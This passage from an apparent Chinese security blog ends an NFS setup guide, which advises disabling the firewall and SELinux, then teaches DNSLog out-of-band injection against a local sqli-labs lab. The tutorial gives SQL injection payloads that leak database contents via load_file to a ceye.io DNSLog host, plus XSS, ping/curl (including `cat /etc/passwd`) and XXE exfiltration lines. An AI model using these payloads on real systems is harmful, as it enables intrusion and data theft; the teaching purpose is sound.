选项：</p><p>选项用来设置输出目录的访问权限、用户映射等。</p><p>NFS主要有3类选项：</p><blockquote><p>访问权限选项</p><ul><li>设置输出目录只读：ro</li><li>设置输出目录读写：rw</li></ul><p>用户映射选项</p><ul><li>all_squash：将远程访问的所有普通用户及所属组都映射为匿名用户或用户组（nfsnobody）；</li><li>no_all_squash：与all_squash取反（默认设置）；</li><li>root_squash：将root用户及所属组都映射为匿名用户或用户组（默认设置）；</li><li>no_root_squash：与rootsquash取反；</li><li>anonuid=xxx：将远程访问的所有用户都映射为匿名用户，并指定该用户为本地用户（UID=xxx）；</li><li>anongid=xxx：将远程访问的所有用户组都映射为匿名用户组账户，并指定该匿名用户组账户为本地用户组账户（GID=xxx）；</li></ul><p>其它选项</p><ul><li>secure：限制客户端只能从小于1024的tcp/ip端口连接nfs服务器（默认设置）；</li><li>insecure：允许客户端从大于1024的tcp/ip端口连接服务器；</li><li>sync：将数据同步写入内存缓冲区与磁盘中，效率低，但可以保证数据的一致性；</li><li>async：将数据先保存在内存缓冲区中，必要时才写入磁盘；</li><li>wdelay：检查是否有相关的写操作，如果有则将这些写操作一起执行，这样可以提高效率（默认设置）；</li><li>no_wdelay：若有写操作则立即执行，应与sync配合使用；</li><li>subtree：若输出目录是一个子目录，则nfs服务器将检查其父目录的权限(默认设置)；</li><li>no_subtree：即使输出目录是一个子目录，nfs服务器也不检查其父目录的权限，这样可以提高效率；</li></ul></blockquote><p>配置好后还需要重启nfs服务</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nfs</span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>查看挂载</li></ol><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e localhost </span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220412210221004.png" alt="查看挂载"></p><p>发现共享文件挂载成功</p><p>最后需要关闭防火墙</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220412212613980.png" alt="关闭防火墙"></p><p>如果不关闭防火墙，客户端无法看到服务端的共享文件夹</p><h3 id="客户端部署-ubuntu"><a href="#客户端部署-ubuntu" class="headerlink" title="客户端部署(ubuntu)"></a>客户端部署(ubuntu)</h3><p>ubuntu上部署与在centos上部署不太一样</p><p>首先安装nfs-common包</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br></pre></td></tr></tbody></table></figure><p>同样的，也会自动安装rpcbind包</p><p>需要启动rpcbind</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start rpcbind</span><br></pre></td></tr></tbody></table></figure><p>查看远端服务器的共享目录</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.35.135</span><br></pre></td></tr></tbody></table></figure><p>客户端创建挂载目录</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data</span><br></pre></td></tr></tbody></table></figure><p>挂载共享目录</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.35.135:/data /data</span><br></pre></td></tr></tbody></table></figure><p>使用df查看磁盘情况可以看到挂载成功</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>当然NFS适用于不同系统、不同类型主机之间进行文件共享，不止局限于ubuntu，centos，甚至windows平台也可以配置NFS。</p></li><li><p>在配置过程中经常出现如下错误</p></li></ul><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clnt_create: RPC: Port mapper failure - Unable to receive: errno 113 (No route to host)</span><br></pre></td></tr></tbody></table></figure><p>说明服务端防火墙没有关闭，没有关闭的话客户端是无法通过网络连接到服务器那端的。服务端部署的最后一步一定要执行。</p><ul><li><p>可能有人会问，为什么NFS部署的过程中为什么会涉及到rpcbind包? </p><p>因为nfs协议本身是没有网络传输功能的，而是基于远程的调度，需要使用rpc提供一个面向远程服务的一个端口，这样就可以通过网络从远程主机进行一些请求</p></li></ul><p>参考文章：</p><p><a href="https://www.cnblogs.com/mchina/archive/2013/01/03/2840040.html">https://www.cnblogs.com/mchina/archive/2013/01/03/2840040.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSLog注入</title>
      <link href="/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-什么是DNSlog注入"><a href="#0x01-什么是DNSlog注入" class="headerlink" title="0x01 什么是DNSlog注入"></a>0x01 什么是DNSlog注入</h2><p>DNSlog注入，也叫DNS带外查询，它是属于带外通信的一种(Out of Band,简称OOB)。</p><p>寻常的注入基本都是在同一个信道上面的，比如正常的get注入，先在url上插入payload做HTTP请求，然后得到HTTP返回包，没有涉及其他信道。而所谓的带外通信，至少涉及两个信道</p><blockquote><p>信道：在计算机中指通信的通道，是信号传输的媒介。</p></blockquote><h2 id="0x02-DNS注入原理"><a href="#0x02-DNS注入原理" class="headerlink" title="0x02 DNS注入原理"></a>0x02 DNS注入原理</h2><ol><li><p>攻击者先向web服务器提交payload语句，比如（<code>select load_file(concat('\\\\','攻击语句',.XXX.ceye.io\\abc))</code>）</p></li><li><p>其中的攻击语句被放到数据库中会被执行，生成的结果与后面的<code>.XXX.ceye.io\\abc</code>构成一个新的域名</p></li><li><p>这时<code>load_file()</code>就可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析</p></li><li><p>此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的<code>ceye.io</code>，这其实是一个开放的Dnslog平台（具体用法在官网可见），在<code>ceye.io</code>上我们可以获取到有关<code>ceye.io</code>的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的NS服务器上，而通过<a href="http://ceye.io我们就可以查询到这条dns解析记录./">http://ceye.io我们就可以查询到这条DNS解析记录。</a></p><p>当然还有其他可以使用的DNSlog平台，如<a href="http://www.dnslog.cn/%E3%80%82">http://www.dnslog.cn/。</a></p><p>这里我就使用<a href="http://ceye.io/">http://ceye.io</a>, 它是一个免费的记录dnslog的平台，注册后到Profile页面会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410183310635-1680762880370-6.png" alt="http://ceye.io用户界面"></p></li></ol><h2 id="0x03-使用场景和条件"><a href="#0x03-使用场景和条件" class="headerlink" title="0x03 使用场景和条件"></a>0x03 使用场景和条件</h2><p>sql的布尔型盲注、时间注入的效率普遍很低且当注入的线程太大容易被waf拦截，并且像一些命令执行，xss以及sql注入攻击有时无法看到回显结果，这时就可以考虑DNSlog注入攻击</p><p>一共是这四个场景：</p><ol><li>SQL盲注</li><li>命令执行（无回显）</li><li>XSS（无回显）</li><li>SSRF(无回显)</li></ol><p>但有个重要条件：<strong>load_file()函数可以使用。</strong></p><p>也就是说需要配置文件my.ini中<code>secure_file_priv=</code></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410182005256.png" alt="secure_file_priv选项配置"></p><blockquote><p><strong>secure_file_priv配置说明</strong></p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p><p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>3、当secure_file_priv为null，load_file就不能加载文件。</p></blockquote><p>在mysql命令行中使用<code>show variables like '%secure%';</code> 可以查看secure_file_priv的情况</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410212338598.png" alt="查看配置情况"></p><p>值为空，说明可以使用load_file()函数</p><p>另外还有几个注意事项：</p><ul><li><p>dnslog注入只能用于windows平台，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个//，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有<strong>unc</strong>路径，也就无法使用dnslog注入。</p></li><li><p>在进行注入的时候，需要先使用测试代码判断该位置是否存在注入，然后再在后面拼接代码，因为对照pyload进行输入的话，可能会出现dnslog网站接收不到的情况。</p></li><li><p>在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。</p></li></ul><blockquote><p>以下内容摘自百度：</p><p>什么是UNC路径？</p><p>UNC(Universal Naming Convention),通用命名规则</p><p>什么是UNC路径？UNC路径就是类似<code>\\softer</code>这样的形式的网络路径。</p><p>UNC为网络（主要指局域网）上资源的完整Windows 2000名称。</p><p>格式：<code>\\servername\sharename</code>，其中servername是服务器名。sharename是共享资源的名称。</p><p>目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</p></blockquote><h2 id="0x04-配合sql注入"><a href="#0x04-配合sql注入" class="headerlink" title="0x04 配合sql注入"></a>0x04 配合sql注入</h2><p>这里我以sqlilabs靶场的lesson-8为例，是sql盲注，注入后不会有回显,那就用刚学的DNSlog来解决!!</p><ul><li>首先报库名：</li></ul><p>payload1:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure><p>说明：</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat 可以拼接字符</span><br><span class="line">load_file()读取文件</span><br><span class="line">\\\\  有两个\用于转义，转义后代表\\</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410184649040.png" alt="示意图"></p><p>在自己的ceye.io平台上查看DNSquery,发现解析记录，可以看到数据库名security</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410185033571.png" alt="结果回显"></p><ul><li>再报表名</li></ul><p>payload2：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure><p>可以看到一个emails表</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410185729538.png" alt="结果回显2"></p><ul><li>再报列名</li></ul><p>payload3:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='emails' limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure><p>payload4:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='emails' limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure><p>分别看到两个列</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410190627252.png" alt="结果回显3"></p><ul><li>报数据：</li></ul><p>因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 </p><p>得到结果再转回去</p><p>payload5:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select hex(concat_ws('~',id,email_id)) from emails limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410191656744.png" alt="结果回显4"></p><p>以上就是DNSlog注入的全部流程</p><p>注入期间我发现，可以将多个payload查询拼接在一起，比如如下注入方法：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select database()),'.',(select version()),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410231848105.png" alt="结果回显5"></p><p>通式:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(payload1),'.',(payload2),(......),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure><h2 id="0x05-配合其他攻击"><a href="#0x05-配合其他攻击" class="headerlink" title="0x05 配合其他攻击"></a>0x05 配合其他攻击</h2><ul><li><strong>xss</strong></li></ul><p>除了SQL注入，DNSlog注入还可以配合其他漏洞使用，比如xss</p><p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p><p>payload:<code>&gt;&lt;img src=http://xss.xxx.ceye.io/aaa&gt;</code>让src来请求我们的dnslog的平台</p><ul><li>命令执行</li></ul><p>说到命令执行，这里就要分windows平台和linux平台</p><ol><li>在windows平台，利用ping命令，有如下payload</li></ol><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ping</span> <span class="variable">%COMPUTERNAME%</span>.xxx.ceye.io</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">ping</span> <span class="variable">%USERNAME%</span>.xxx.ceye.io</span><br></pre></td></tr></tbody></table></figure><p>执行成功，可以在dns平台上看到主机名或用户名</p><ol start="2"><li>在linux平台，利用curl命令，有如下payload</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.xxx.ceye.io/`<span class="built_in">whoami</span>`</span><br><span class="line">curl http://ip.port.xxx.ceye.io/`<span class="built_in">cat</span> /etc/passwd`</span><br></pre></td></tr></tbody></table></figure><p>反引号中可以写入各种linux命令</p><ul><li>SSRF</li></ul><p>payload如下：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">"http://ip.port.xxx.ceye.io/xxe_test"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>其实也算是和XXE配合使用</p><p>以上这些payload都可以在<a href="http://ceye.io/payloas">http://ceye.io/payloas</a> 中看到</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p><p><a href="https://www.cnblogs.com/Xiaoming0/p/13966667.html">https://www.cnblogs.com/Xiaoming0/p/13966667.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNSLog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
